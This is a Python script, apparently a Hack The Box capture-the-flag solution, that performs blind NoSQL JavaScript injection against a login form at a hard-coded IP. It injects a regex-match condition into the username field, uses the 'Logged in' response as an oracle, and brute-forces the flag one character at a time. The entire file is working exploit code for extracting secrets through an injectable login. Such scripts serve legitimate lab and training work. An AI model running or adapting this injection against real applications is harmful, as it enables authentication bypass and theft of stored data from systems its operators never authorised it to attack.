#!/usr/bin/python3

import requests
import string
import time

def try_pattern(pattern):
    url = "http://83.136.255.243:52879/index.php"
    
    payload = f'username=" || (this.username.match(\'^{pattern}\')) || ""=="&password=wtewt'
    
    headers = {
        'Host': '83.136.255.243:52879',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:135.0) Gecko/20100101 Firefox/135.0',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
        'Accept-Language': 'en-US,en;q=0.5',
        'Accept-Encoding': 'gzip, deflate, br',
        'Content-Type': 'application/x-www-form-urlencoded',
        'Origin': 'http://83.136.255.243:52879',
        'Referer': 'http://83.136.255.243:52879/index.php',
        'Connection': 'keep-alive',
        'Upgrade-Insecure-Requests': '1'
    }
    
    try:
        r = requests.post(url, data=payload, headers=headers, timeout=5)
        return "Logged in" in r.text
    except:
        time.sleep(1)
        return False

def print_progress(flag, char, pos):
    print(f"\rTrying: {flag}{char} | Position: {pos}/32", end="", flush=True)

# Verify the oracle is working
print("Testing oracle...")
assert not try_pattern("INVALID"), "Invalid pattern test failed"
assert try_pattern("HTB{"), "Valid pattern test failed"
print("Oracle working!")

# Start bruteforce
flag = "HTB{"
chars = string.ascii_letters + string.digits + "_-{}"
pos = 0

print("\nStarting bruteforce...")

try:
    while len(flag) < 37:  # HTB{} + 32 chars
        found = False
        pos += 1
        
        for c in chars:
            print_progress(flag, c, pos)
            
            if try_pattern(flag + c):
                flag += c
                print(f"\nFound: {flag}")
                found = True
                break
            
            time.sleep(0.1)  # Rate limiting
        
        if not found:
            if len(flag) == 36:  # Try closing brace
                flag += "}"
                print(f"\nFlag found: {flag}")
                break
            else:
                print("\nNo matching character found!")
                break

except KeyboardInterrupt:
    print("\nBruteforce interrupted!")

except Exception as e:
    print(f"\nError occurred: {e}")

finally:
    print("\nFinal flag:", flag)
    # Save result
    with open("flag.txt", "w") as f:
        f.write(flag)
    print("Flag saved to flag.txt")